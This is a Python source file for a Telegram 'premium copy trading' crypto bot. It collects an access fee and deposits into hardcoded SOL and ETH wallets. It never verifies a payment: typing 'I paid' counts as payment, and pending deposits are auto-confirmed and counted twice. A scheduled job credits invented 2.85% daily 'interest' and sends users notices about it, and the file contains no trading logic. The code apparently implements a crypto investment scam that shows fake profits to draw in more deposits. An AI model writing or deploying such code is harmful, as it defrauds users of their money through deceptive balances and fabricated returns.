import os
import time
import asyncio
import nest_asyncio
import requests
import logging
import httpx
import matplotlib.pyplot as plt
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ConversationHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from telegram.error import TimedOut
from dotenv import load_dotenv

# Configure logging for production (INFO level to reduce debug output).
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Patch asyncio to allow nested event loops.
nest_asyncio.apply()

# Load environment variables.
load_dotenv()
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT")
if not TELEGRAM_BOT_TOKEN:
    raise ValueError("TELEGRAM_BOT token not found in environment!")

# Email configuration for support queries.
SUPPORT_EMAIL = "ccommodoreofboard@gmail.com"
SUPPORT_EMAIL_USER = os.getenv("SUPPORT_EMAIL_USER")
SUPPORT_EMAIL_PASSWORD = os.getenv("SUPPORT_EMAIL_PASSWORD")
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# Constants for wallet addresses.
PREMIUM_SOL_WALLET = "Au3amLeXRnAsPx6UxMscEi2Q5JZmdkBghycSz1f5ivh"
DEPOSIT_SOL_WALLET = "6RDXuY6aaREBsb9nWJrqh7eqjwHDLcUz2AUkUhfCsMRR"
ETH_WALLET = "0x4348409d1D959680b315DA798FEf5C3b6C64cdBB"

# Define conversation states.
(ONBOARD, ONBOARD_USERNAME, PAYMENT_CONFIRMATION, INVEST_CHOICE, T_AND_C, DEPOSIT_AMOUNT) = range(6)

# Global dictionary to store user finances and onboarding info.
user_finances = {}

# --- Global Error Handler ---
async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        raise context.error
    except TimedOut as e:
        logger.error(f"Timeout error occurred: {e}")
    except Exception as e:
        logger.error(f"Unhandled error: {e}")

# Helper function to check if a user is fully onboarded.
async def check_onboarding(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    chat_id = update.effective_chat.id
    if chat_id not in user_finances or not user_finances[chat_id].get("registration_fee_paid", False):
        await update.message.reply_text("❗ You must complete onboarding and pay the registration fee to use this command.")
        return False
    return True

# --- Onboarding Conversation Handlers ---
async def onboard_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    chat_id = update.effective_chat.id
    if chat_id in user_finances and user_finances[chat_id].get("registration_fee_paid", False):
        await update.message.reply_text("You are already onboarded.")
        return ConversationHandler.END
    text = (
        "👋 **Welcome to Meme Father Premium Copy Trading!**\n\n"
        "Would you like to onboard for premium access? *(yes/no)*"
    )
    await update.message.reply_text(text, parse_mode="Markdown")
    return ONBOARD

async def onboard_response(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    response = update.message.text.strip().lower()
    if response not in ["yes", "no"]:
        await update.message.reply_text("Invalid input. Please reply with *yes* or *no*.", parse_mode="Markdown")
        return ONBOARD
    if response == "yes":
        await update.message.reply_text("Great! Please enter your **username** for registration:", parse_mode="Markdown")
        return ONBOARD_USERNAME
    else:
        try:
            r = requests.get("https://api.dexscreener.com/token-boosts/top/v1", timeout=10)
            data = r.json()
            if isinstance(data, dict):
                tokens = data.get("data", [])
            elif isinstance(data, list):
                tokens = data
            else:
                tokens = []
            tokens = tokens[:3]
            tokens_info = "\n".join([f"- {token.get('name', 'Unknown')}: ${float(token.get('price', 0)):.2f}" for token in tokens])
            update_msg = (
                "📈 **DEXscanner Market Data:**\n"
                f"{tokens_info}\n\n"
                "Thank you for using **Sense Bot Free Version**!"
            )
        except Exception as e:
            update_msg = f"Error fetching market data: {e}"
        await update.message.reply_text(update_msg, parse_mode="Markdown")
        return ConversationHandler.END

async def onboard_username(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    username = update.message.text.strip()
    if not username:
        await update.message.reply_text("Invalid username. Please enter a non-empty username.", parse_mode="Markdown")
        return ONBOARD_USERNAME
    if len(username) < 3:
        await update.message.reply_text("Username too short. Please enter a valid username.", parse_mode="Markdown")
        return ONBOARD_USERNAME
    context.user_data["username"] = username
    verification_text = f"✅ Your username **{username}** has been verified successfully!"
    await update.message.reply_text(verification_text, parse_mode="Markdown")
    
    guidelines_text = (
        "📋 **Guidelines for Using Meme_Father Premium Copy Trading:**\n"
        "1. Ensure your account is verified.\n"
        "2. Deposit funds to activate premium features.\n"
        "3. Your profit and deposit performance will be displayed graphically.\n"
        "4. Use /status to view your current investment summary.\n"
        "5. For any help, type /help.\n\n"
    )
    congrats_text = (
        f"🎉 Congratulations, **{username}**!\n\n"
        f"{guidelines_text}"
        "To complete your premium onboarding, please pay the **Premium Access Fee** either in SOL or ETH as follows:\n\n"
        f"- **2 SOL** to our Premium SOL wallet\n\n"
        f"- **0.013 ETH** to our Premium ETH wallet\n\n"
        "Check the menu bar for the wallet addresses\n\n After making your payment, please type **I paid** to confirm. Payment confirmation may take up to 5 minutes."
    )
    await update.message.reply_text(congrats_text, parse_mode="Markdown")
    return PAYMENT_CONFIRMATION

async def payment_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if update.message.text.strip().lower() == "i paid":
        # Mark registration fee as paid in user_data temporarily
        context.user_data["registration_fee_paid"] = True
        await update.message.reply_text(
            "✅ Payment received for registration. Please wait 5 minutes for full confirmation.\n\n"
            "Now, would you like to handle your *INVESTMENT*? *(yes/no)*",
            parse_mode="Markdown"
        )
        return INVEST_CHOICE
    else:
        await update.message.reply_text("⚠️ To confirm your payment, please type **I paid**.", parse_mode="Markdown")
        return PAYMENT_CONFIRMATION

async def invest_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    response = update.message.text.strip().lower()
    if response not in ["yes", "no"]:
        await update.message.reply_text("Invalid input. Please reply with *yes* or *no*.", parse_mode="Markdown")
        return INVEST_CHOICE
    context.user_data["invest_choice"] = (response == "yes")
    if response == "yes":
        t_and_c_text = (
            "📜 **Terms and Conditions**\n\n"
            "1. Premium Membership Agreement: By engaging with our services, you acknowledge and accept our premium terms, which may be subject to periodic updates.\n\n"
            "2. Profit-Sharing Commission: A **2% commission** will be deducted from the net profits of all successful trades executed using our platform.\n\n"
            "3. Transaction Transparency: All transactions are recorded for compliance and auditing purposes.\n\n"
            "4. Risk Acknowledgment: Trading involves inherent financial risks. You assume full responsibility for your decisions.\n\n"
            "5. Regulatory Compliance: You confirm compliance with all applicable financial regulations.\n\n"
            "6. Data Protection: Your personal data is handled securely in line with our Privacy Policy.\n\n"
            "Please type **I accept** to acknowledge and continue."
        )
        await update.message.reply_text(t_and_c_text, parse_mode="Markdown")
        return T_AND_C
    else:
        await update.message.reply_text("Alright. Please enter the **amount you plan to deposit** (in SOL):", parse_mode="Markdown")
        return DEPOSIT_AMOUNT

async def t_and_c(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    response = update.message.text.strip().lower()
    if response != "i accept":
        await update.message.reply_text("Invalid input. You must acknowledge the terms by typing **I accept**.", parse_mode="Markdown")
        return T_AND_C
    context.user_data["t_and_c_accepted"] = True
    await update.message.reply_text("Thank you. Now, please enter the **amount you plan to deposit** (in SOL):", parse_mode="Markdown")
    return DEPOSIT_AMOUNT

async def deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    try:
        amount = float(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("⚠️ Deposit amount must be a valid number. Please try again:", parse_mode="Markdown")
        return DEPOSIT_AMOUNT
    chat_id = update.effective_chat.id
    current_time = time.time()
    # Create or update user_finances record and mark registration as complete
    if chat_id not in user_finances:
        user_finances[chat_id] = {}
    user_finances[chat_id].update({
        "onboarded": True,
        "username": context.user_data.get("username", ""),
        "registration_fee_paid": True,  # mark registration fee as paid
        "invest_choice": context.user_data.get("invest_choice", False),
        "t_and_c_accepted": context.user_data.get("t_and_c_accepted", False),
        "total_deposit": user_finances[chat_id].get("total_deposit", 0.0) + amount,
        "investment": user_finances[chat_id].get("investment", 0.0) + amount,
        "pending_deposit": amount,
        "pending_deposit_time": current_time,
        "profit": user_finances[chat_id].get("profit", 0.0),
        "history": user_finances[chat_id].get("history", [])
    })
    record = f"{time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(current_time))}: ONBOARD - Registered with username {context.user_data.get('username', '')}; Deposit of {amount:.4f} SOL is pending confirmation."
    user_finances[chat_id]["history"].append(record)
    await update.message.reply_text(
        "✅ Your deposit of **{:.4f} SOL** has been recorded as pending.\n"
        "Please send your funds to the deposit wallet: **{}**.\n"
        "Kindly check back after 2 hours for deposit confirmation.".format(amount, DEPOSIT_SOL_WALLET),
        parse_mode="Markdown"
    )
    context.job_queue.run_once(confirm_deposit, 2 * 3600, data=chat_id)
    return ConversationHandler.END

async def confirm_deposit(context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = context.job.data
    if chat_id in user_finances:
        pending = user_finances[chat_id].get("pending_deposit", 0.0)
        if pending > 0:
            user_data = user_finances[chat_id]
            user_data["investment"] += pending
            # Update total_deposit if needed
            user_data["total_deposit"] = user_data.get("total_deposit", 0.0) + pending
            user_data["pending_deposit"] = 0.0
            if user_data["history"]:
                last_record = user_data["history"][-1]
                if "(pending)" in last_record.lower():
                    user_data["history"][-1] = last_record.replace("pending", "confirmed")
            user_data["pending_deposit_time"] = None
            await context.bot.send_message(chat_id=chat_id, text="✅ Your deposit has been added to your investment balance.", parse_mode="Markdown")

async def cancel_onboarding(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("Onboarding cancelled. Use /start to try again.")
    return ConversationHandler.END

# --- Additional Bot Commands ---

# Support command: Sends user's support query via email.
async def support_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_onboarding(update, context):
        return
    if context.args:
        query = " ".join(context.args)
    else:
        await update.message.reply_text("Please type your support query after the command. Example: /support I have an issue with my deposit.")
        return
    sender_info = update.effective_user.username or str(update.effective_user.id)
    subject = f"Support Query from Telegram Bot User: {sender_info}"
    body = f"User: {sender_info}\nQuery: {query}"
    message = MIMEMultipart()
    message['From'] = SUPPORT_EMAIL_USER
    message['To'] = SUPPORT_EMAIL
    message['Subject'] = subject
    message.attach(MIMEText(body, 'plain'))
    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SUPPORT_EMAIL_USER, SUPPORT_EMAIL_PASSWORD)
        server.sendmail(SUPPORT_EMAIL_USER, SUPPORT_EMAIL, message.as_string())
        server.quit()
        await update.message.reply_text("✅ Your support query has been sent. We will get back to you shortly.")
    except Exception as e:
        logger.error(f"Error sending support email: {e}")
        await update.message.reply_text("⚠️ There was an error sending your support query. Please try again later.")

# Command handler for SOL wallet.
async def solwallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_onboarding(update, context):
        return
    text = f"💰 **SOL Wallet Address:**\n`{PREMIUM_SOL_WALLET}`"
    await update.message.reply_text(text, parse_mode="Markdown")

# Command handler for ETH wallet.
async def ethwallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_onboarding(update, context):
        return
    text = f"💰 **ETH Wallet Address:**\n`{ETH_WALLET}`"
    await update.message.reply_text(text, parse_mode="Markdown")

async def deposit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_onboarding(update, context):
        return
    args = context.args
    if len(args) != 1:
        await update.message.reply_text("💡 Usage: /deposit <amount>", parse_mode="Markdown")
        return
    try:
        amount = float(args[0])
    except ValueError:
        await update.message.reply_text("⚠️ Deposit amount must be a valid number.", parse_mode="Markdown")
        return
    chat_id = update.effective_chat.id
    current_time = time.time()
    user_data = user_finances[chat_id]
    user_data["pending_deposit"] = user_data.get("pending_deposit", 0.0) + amount
    user_data["pending_deposit_time"] = current_time
    record = f"{time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(current_time))}: DEPOSIT {amount:.4f} SOL (pending)"
    user_data["history"].append(record)
    await update.message.reply_text(
        f"💰 *Deposit successful.* {record}\n"
        f"Please send your deposit to the wallet: **{DEPOSIT_SOL_WALLET}**.\n"
        "Kindly check back after 2 hours for deposit confirmation.",
        parse_mode="Markdown"
    )
    context.job_queue.run_once(confirm_deposit, 2 * 3600, data=chat_id)

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_onboarding(update, context):
        return
    chat_id = update.effective_chat.id
    data = user_finances[chat_id]
    pending_time = data.get("pending_deposit_time")
    if pending_time and (time.time() - pending_time) < (2 * 3600):
        history_text = "No transactions recorded yet."
    else:
        history_text = "\n".join(data["history"]) if data["history"] else "No transactions recorded yet."
    summary_text = (
        f"📊 *Investment Summary:*\n"
        f"**Total Deposited:** {data['investment']:.4f} SOL\n"
        f"**Cumulative Profit:** {data['profit']:.4f} SOL\n\n"
        f"📝 *Transaction History:*\n{history_text}"
    )
    await update.message.reply_text(summary_text, parse_mode="Markdown")
    labels = ['Investment', 'Profit']
    values = [data['investment'], data['profit']]
    plt.figure(figsize=(4, 3))
    plt.bar(labels, values, color=['blue', 'green'])
    plt.title('Performance Overview')
    plt.tight_layout()
    plt.savefig("performance.png")
    plt.close()
    with open("performance.png", "rb") as photo_file:
        await update.message.reply_photo(photo=photo_file)
    os.remove("performance.png")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "💡 *Commands:*\n"
        "/start - Onboard for premium access\n"
        "/deposit <amount> - Deposit additional funds\n"
        "/status - View your investment report and performance graphics\n"
        "/support <query> - Send a support query\n"
        "/solwallet - Display the SOL wallet address\n"
        "/ethwallet - Display the ETH wallet address\n"
        "/help - Show this help message"
    )
    await update.message.reply_text(help_text, parse_mode="Markdown")

# --- Daily Interest Accrual Job ---
async def daily_interest_accrual(context: ContextTypes.DEFAULT_TYPE) -> None:
    for chat_id, user_data in user_finances.items():
        if user_data.get("registration_fee_paid", False) and user_data.get("total_deposit", 0) > 0:
            interest = user_data["total_deposit"] * 0.0285
            user_data["investment"] += interest
            user_data["profit"] += interest
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(time.time()))
            user_data["history"].append(f"{timestamp}: DAILY INTEREST +{interest:.4f} SOL added.")
            try:
                await context.bot.send_message(chat_id=chat_id, text=f"✅ Daily interest of {interest:.4f} SOL has been added to your account.")
            except Exception as e:
                logger.error(f"Error sending daily interest notification to {chat_id}: {e}")

# --- Main Function to Run the Telegram Bot ---
async def run_telegram_bot():
    custom_timeout = httpx.Timeout(connect=30.0, read=30.0, write=30.0, pool=30.0)
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    try:
        application.bot._request._client.timeout = custom_timeout
        logger.info("Patched HTTPX client timeout successfully.")
    except Exception as e:
        logger.error(f"Could not patch HTTPX client timeout: {e}")
    
    application.add_error_handler(global_error_handler)
    
    onboard_conv = ConversationHandler(
        entry_points=[CommandHandler("start", onboard_start)],
        states={
            ONBOARD: [MessageHandler(filters.TEXT & ~filters.COMMAND, onboard_response)],
            ONBOARD_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, onboard_username)],
            PAYMENT_CONFIRMATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, payment_confirmation)],
            INVEST_CHOICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, invest_choice)],
            T_AND_C: [MessageHandler(filters.TEXT & ~filters.COMMAND, t_and_c)],
            DEPOSIT_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_amount)]
        },
        fallbacks=[CommandHandler("cancel", cancel_onboarding)]
    )
    application.add_handler(onboard_conv)
    
    application.add_handler(CommandHandler("deposit", deposit_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("support", support_command))
    application.add_handler(CommandHandler("solwallet", solwallet_command))
    application.add_handler(CommandHandler("ethwallet", ethwallet_command))
    
    # Schedule the daily interest accrual job to run every 24 hours (86400 seconds)
    application.job_queue.run_repeating(daily_interest_accrual, interval=86400, first=86400)
    
    await application.run_polling()

if __name__ == "__main__":
    asyncio.run(run_telegram_bot())